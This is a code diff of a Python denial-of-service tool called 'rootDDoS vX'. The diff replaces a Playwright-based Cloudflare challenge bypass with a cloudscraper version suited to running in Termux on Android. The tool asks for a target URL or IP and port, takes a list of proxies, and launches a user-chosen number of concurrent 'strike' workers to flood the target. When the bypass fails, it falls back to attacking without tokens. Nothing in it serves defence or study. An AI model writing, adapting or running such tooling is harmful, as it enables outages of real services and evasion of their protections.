@@ -1,34 +1,30 @@
 import asyncio
 import aiohttp
-from playwright.async_api import async_playwright
-from playwright_stealth import stealth_async
+import cloudscraper
 import random
 import os
 import sys
 
-async def get_valid_tokens(target_url):
-    print("\n[SYSTEM] INITIALIZING BYPASS ENGINE...")
-    async with async_playwright() as p:
-        browser = await p.chromium.launch(headless=True)
-        context = await browser.new_context()
-        page = await context.new_page()
-        await stealth_async(page)
-        try:
-            await page.goto(target_url, wait_until="networkidle")
-            await asyncio.sleep(10)
-            cookies = await context.cookies()
-            user_agent = await page.evaluate("navigator.userAgent")
-            cookie_str = "; ".join([f"{c['name']}={c['value']}" for c in cookies])
-            await browser.close()
+# Cloudflare Bypass Engine (Termux-Friendly)
+def get_valid_tokens_termux(target_url):
+    print("\n[SYSTEM] INITIALIZING LIGHTWEIGHT BYPASS ENGINE...")
+    try:
+        scraper = cloudscraper.create_scraper()
+        # Challenge'ı çözmeye çalış ve session bilgilerini al
+        resp = scraper.get(target_url, timeout=10)
+        cookie_str = "; ".join([f"{k}={v}" for k, v in resp.cookies.get_dict().items()])
+        user_agent = scraper.user_agents.get_default()
+        
+        if "cf_clearance" in cookie_str or resp.status_code == 200:
             return cookie_str, user_agent
-        except Exception as e:
-            print(f"[CRITICAL] BYPASS FAILED: {str(e)}")
-            await browser.close()
-            return None, None
+        return None, None
+    except Exception as e:
+        print(f"[CRITICAL] BYPASS FAILED: {str(e)}")
+        return None, None
 
 async def operational_strike(target, cookies, ua, proxy_list, mode):
     headers = {
-        "User-Agent": ua if ua else "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Root404/1.0",
+        "User-Agent": ua if ua else "Mozilla/5.0 (Android 13; Mobile; rv:120.0) Root404/1.0",
         "Accept": "*/*",
         "Connection": "keep-alive"
     }
@@ -51,31 +47,40 @@ async def operational_strike(target, cookies, ua, proxy_list, mode):
 async def main():
     os.system('clear')
     print("="*60)
-    print("      rootDDoS vX | PROFESSIONAL STRESS ENGINE")
+    print("      rootDDoS vX | PROFESSIONAL TERMUX ENGINE")
     print("      OPERATIONAL UNIT: Root404")
     print("="*60)
+    
     print("[1] URL TARGET (L7 Bypass Mode)")
     print("[2] IP TARGET (Direct Attack Mode)")
     mode = input("\n[!] SELECT OPERATION MODE: ")
+
     if mode == "1":
-        target = input("[!] TARGET URL (e.g., https://example.com): ")
+        target = input("[!] TARGET URL: ")
     else:
         ip = input("[!] TARGET IP: ")
         port = input("[!] TARGET PORT: ")
         target = f"http://{ip}:{port}"
+
     print("\n[!] INPUT PROXY LIST (PASTE AND PRESS CTRL+D):")
     input_data = sys.stdin.read()
     proxies = [line.strip() for line in input_data.splitlines() if line.strip()]
+    
     if not proxies:
         print("[CRITICAL] NO PROXY DETECTED.")
         return
+
     intensity = int(input("\n[!] STRIKE INTENSITY (WORKER COUNT): "))
+
     cookies, ua = None, None
     if mode == "1":
-        cookies, ua = await get_valid_tokens(target)
+        cookies, ua = get_valid_tokens_termux(target)
         if not cookies:
-            return
-        print("[INFO] BYPASS SUCCESSFUL.")
+            print("[INFO] DIRECT STRIKE WITHOUT TOKENS...")
+        else:
+            print("[INFO] BYPASS SUCCESSFUL. TOKENS INJECTED.")
+
+    print(f"\n[INFO] DEPLOYING {intensity} OPERATIONAL WORKERS...")
     tasks = [asyncio.create_task(operational_strike(target, cookies, ua, proxies, mode)) for _ in range(intensity)]
     await asyncio.gather(*tasks)
 
@@ -84,4 +89,4 @@ if __name__ == "__main__":
         asyncio.run(main())
     except KeyboardInterrupt:
         print("\n[FINALIZE] OPERATION TERMINATED.")
-          
+                
